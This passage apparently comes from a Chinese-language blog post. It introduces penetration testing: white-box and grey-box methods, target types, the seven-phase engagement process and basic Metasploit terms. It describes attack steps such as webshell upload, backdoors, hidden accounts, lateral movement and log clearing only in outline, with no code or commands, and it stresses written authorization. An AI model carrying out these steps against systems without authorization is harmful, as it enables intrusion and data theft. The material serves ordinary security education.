&lt;li&gt;&lt;strong&gt;概念：&lt;/strong&gt; 测试人员在&lt;strong&gt;拥有目标系统全部或近乎全部信息&lt;/strong&gt;的情况下进行测试。这通常包括源代码、架构设计文档、网络拓扑图、数据库 schema、API接口文档，甚至开发团队的直接沟通。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;信息来源：&lt;/strong&gt; 客户或开发团队提供的所有内部资料。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;全面深入：&lt;/strong&gt; 可以系统性地审查所有代码路径、配置和接口，漏洞发现率最高。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;效率极高：&lt;/strong&gt; 无需猜测和盲目探测，可直接定位可能存在问题的代码模块。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;发现根源问题：&lt;/strong&gt; 不仅能找到漏洞，还能精准定位漏洞的代码行和根本原因，便于修复。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;早期介入：&lt;/strong&gt; 可以在开发阶段（如SAST，静态应用安全测试）或上线前进行。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;不模拟真实攻击：&lt;/strong&gt; 无法评估系统在外部攻击者视角下的真实表现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可能忽略配置漏洞：&lt;/strong&gt; 过于关注代码，可能忽略运行时环境、网络配置等导致的问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;依赖测试人员技术深度：&lt;/strong&gt; 需要测试人员具备很强的代码审计和架构理解能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;适用场景：&lt;/strong&gt; 代码安全审计、SDL（安全开发生命周期）中的安全测试、内部安全评估、对特定复杂应用进行深度检查。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="灰盒测试"&gt;灰盒测试
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;概念：&lt;/strong&gt; 介于黑盒与白盒之间。测试人员拥有&lt;strong&gt;部分、有限的内部信息&lt;/strong&gt;。例如，一个低权限的用户账号、部分API文档、系统使用的技术框架信息，或者基本的网络架构图。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;信息来源：&lt;/strong&gt; 客户提供有限信息 + 测试人员自身信息收集。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;平衡效率与真实性：&lt;/strong&gt; 在模拟一定真实攻击的同时，利用有限信息提高测试的深度和效率。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;聚焦特权升级：&lt;/strong&gt; 非常适合测试从低权限用户到高权限（垂直越权）或跨用户访问（水平越权）的漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;评估内部威胁：&lt;/strong&gt; 模拟内部员工或供应链攻击的场景。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;范围难以界定：&lt;/strong&gt; 提供多少信息算“灰盒”需要与客户事先清晰约定。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可能遗漏两方面问题：&lt;/strong&gt; 既可能不如白盒全面，也可能不如黑盒真实。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;适用场景：&lt;/strong&gt; 最常见的渗透测试类型。适用于大多数需要对已上线系统进行内部和外部综合评估的项目，如Web应用渗透测试、移动应用测试（已知部分后端API）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="目标分类"&gt;目标分类
&lt;/h2&gt;&lt;h3 id="主机操作系统渗透"&gt;主机操作系统渗透
&lt;/h3&gt;&lt;p&gt;​ 如Windows、Solaris、AIX、Linux、SCO、SGI等操作系统本身进行渗透测试&lt;/p&gt;
&lt;h3 id="数据库系统渗透"&gt;数据库系统渗透
&lt;/h3&gt;&lt;p&gt;​ 对MS-SQL、Oracle、MySQL、Informix、Sybase、DB2、Access等数据库应用系统进行渗透测试&lt;/p&gt;
&lt;h3 id="应用系统渗透"&gt;应用系统渗透
&lt;/h3&gt;&lt;p&gt;​ 对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试&lt;/p&gt;
&lt;h3 id="网络设备渗透"&gt;网络设备渗透
&lt;/h3&gt;&lt;p&gt;​ 对各种防火墙、入侵检测系统、网络设备进行渗透测试&lt;/p&gt;
&lt;h2 id="渗透测试过程环节"&gt;渗透测试过程环节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;前期交互阶段（Pre-Engagement Interaction）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;情报搜集阶段（Information Gathering）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;威胁建模阶段（Threat Modeling）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;漏洞分析阶段（Vulnerability Analysis）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;渗透攻击阶段（Exploitation）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后渗透攻击阶段（Post Exploitation）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;报告阶段（Reporting）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="1-前期交互阶段"&gt;&lt;strong&gt;1. 前期交互阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;正式测试开始前的规划和约定阶段，旨在明确测试的范围、规则和目标，确保测试合法、有效且可控。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心活动&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;确定范围&lt;/strong&gt;：与客户共同商定哪些系统、网络、应用程序或IP地址可以测试，哪些是绝对禁止的（如生产数据库、客户数据等）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;确定规则&lt;/strong&gt;：定义测试方法（黑盒、白盒还是灰盒）、攻击强度（是否允许造成服务中断、社会工程攻击等）、测试时间窗口（是否只能在非工作时间进行）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;法律授权&lt;/strong&gt;：签署&lt;strong&gt;渗透测试授权书&lt;/strong&gt;，这是最重要的法律文件，确保测试行为合法，保护测试方和客户。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;确定目标&lt;/strong&gt;：明确测试的最终目的是什么（如：验证特定防火墙策略、评估新上线的Web应用安全、满足合规性要求等）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;输出物&lt;/strong&gt;：授权书、范围定义文档、沟通计划。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="2-情报搜集阶段"&gt;&lt;strong&gt;2. 情报搜集阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;“信息收集”，是测试的基石。尽可能多地收集关于目标的各种信息，为后续攻击寻找入口。情报分为两类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;被动情报搜集&lt;/strong&gt;：在不与目标系统直接交互的情况下，通过公开渠道获取信息。例如：搜索引擎、社交媒体、Whois域名信息、DNS记录、公开的代码仓库、新闻稿等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;主动情报搜集&lt;/strong&gt;：通过与目标系统直接交互来获取信息，但可能被记录。例如：端口扫描、服务指纹识别、网络拓扑探测等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关键目标&lt;/strong&gt;：发现目标的所有网络资产、域名、子域名、IP地址、开放端口、运行的服务版本、员工信息、技术栈等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="3-威胁建模阶段"&gt;&lt;strong&gt;3. 威胁建模阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;对收集到的信息进行分析和提炼，识别出可能被利用的资产、潜在的安全漏洞和攻击路径。这是一个分析规划阶段。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心活动&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资产识别&lt;/strong&gt;：梳理出高价值的攻击目标（如数据库服务器、文件服务器、Web应用后台）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击面分析&lt;/strong&gt;：分析目标暴露的所有可能被攻击的点（如开放的远程管理端口、未认证的Web API、过时的框架）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击向量规划&lt;/strong&gt;：基于情报，构思可能的攻击路径和方法。例如：“通过钓鱼邮件获取员工凭证 -&amp;gt; 登录VPN -&amp;gt; 利用内部文件服务器的漏洞获取域控权限”。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工具与技术选择&lt;/strong&gt;：根据分析结果，准备下一阶段所需的漏洞扫描工具、攻击载荷等。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="4-漏洞分析阶段"&gt;&lt;strong&gt;4. 漏洞分析阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;对已识别的攻击面进行深入探测，以发现和验证具体的安全漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心活动&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;自动化扫描&lt;/strong&gt;：使用Nessus、Nexpose、AWVS等漏洞扫描器进行系统性扫描，生成初步漏洞报告。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;手动验证与分析&lt;/strong&gt;：&lt;strong&gt;这是体现测试人员技术的关键&lt;/strong&gt;。对扫描器报告的结果进行去误报、分析漏洞的可利用性和实际风险等级。扫描器找不到的逻辑漏洞、业务逻辑缺陷、配置错误等，需要在此阶段通过手动测试发现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞优先级排序&lt;/strong&gt;：根据CVSS分数、利用难度、对业务的影响等因素，对漏洞进行排序，决定后续攻击的优先级。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="5-渗透攻击阶段"&gt;&lt;strong&gt;5. 渗透攻击阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;这是模拟真实攻击者的核心环节，尝试利用已发现的漏洞来突破安全防线，获取对系统或数据的未授权访问。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心活动&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;漏洞利用&lt;/strong&gt;：使用Metasploit、定制化的EXP或手动攻击方式，利用漏洞获取初始访问权限。例如：利用SQL注入获取数据库数据、利用文件上传漏洞上传Webshell、利用缓冲区溢出漏洞获取系统Shell。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;突破边界&lt;/strong&gt;：成功从一个外部点（如Web服务器）攻入内部网络。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限提升&lt;/strong&gt;：在已控制的主机上，从普通用户权限提升为管理员/系统权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关键点&lt;/strong&gt;：此阶段需要谨慎操作，避免对目标系统造成意外损害。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="6-后渗透攻击阶段"&gt;&lt;strong&gt;6. 后渗透攻击阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;在成功渗透进入目标系统后，模拟高级持续性威胁的攻击行为，目标是展示漏洞被利用后可能造成的实际业务影响。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;核心活动&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;权限维持&lt;/strong&gt;：在目标系统上安装后门、创建隐藏账户等，以维持长期控制。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;横向移动&lt;/strong&gt;：以已控制的机器为跳板，探测和攻击内网中的其他重要主机（如数据库服务器、域控制器）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目标达成&lt;/strong&gt;：窃取或篡改敏感数据（在授权范围内）、完全控制核心系统、访问关键业务功能等，以证明漏洞的严重性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;足迹清理&lt;/strong&gt;：根据测试规则，可能需要清除测试过程中留下的日志、工具等痕迹（模拟真实攻击者），也可能保留用于报告证据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="7-报告阶段"&gt;&lt;strong&gt;7. 报告阶段&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;将整个测试过程、发现、影响和建议以清晰、专业的形式呈现给客户，这是渗透测试价值最终交付的体现。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;报告内容&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;执行摘要&lt;/strong&gt;：用非技术语言向管理层阐述测试概述、发现的高风险问题及其对业务的潜在影响。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;技术细节&lt;/strong&gt;：详细描述每个漏洞的发现过程（步骤、截图）、原理、影响范围和修复建议。这部分是给技术人员看的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;风险评级&lt;/strong&gt;：对每个漏洞进行严重程度评级（如高、中、低）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;修复建议&lt;/strong&gt;：提供具体、可操作的修复方案或缓解措施。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;附录&lt;/strong&gt;：可能包含工具输出、日志片段等证据材料。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="渗透实践-metasploit开源的渗透测试框架"&gt;渗透实践-Metasploit开源的渗透测试框架
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Exploit（渗透攻击）&lt;/strong&gt;：渗透攻击是指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、WEB应用程序漏洞攻击（SQL注入、XSS等），以及利用配置错误等&lt;/li&gt;
&lt;li&gt;**Palyload（攻击载荷）**攻击载荷是我们期望目标系统在被渗透攻击之后执行的代码。在Metasploit框架中可以自由选择、传送和植入&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ShellCode&lt;/strong&gt;：SellCode是渗透攻击时作为攻击载荷运行的一组机器指令，通常用汇编语言编写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Module（模块）&lt;/strong&gt;：Metasploit中一个模块是指Metasploit框架中所使用的一段软件代码组件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Listener（监听器）&lt;/strong&gt;：监听器是Metasploit中用来等待接入网络连接主机的组件&lt;/li&gt;
&lt;/ul&gt;</description></item></channel></rss>